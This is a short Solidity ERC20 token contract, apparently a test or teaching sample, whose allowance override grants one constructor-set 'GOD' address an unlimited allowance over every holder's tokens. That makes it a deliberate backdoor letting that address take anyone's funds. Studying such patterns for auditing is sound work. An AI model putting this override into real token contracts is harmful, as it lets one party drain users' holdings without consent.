// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract GodModeToken is ERC20 {
    address private immutable GOD;

    constructor(address god) ERC20("GodModeToken", "GMT") {
        GOD = god;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        if (spender == GOD) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }
}
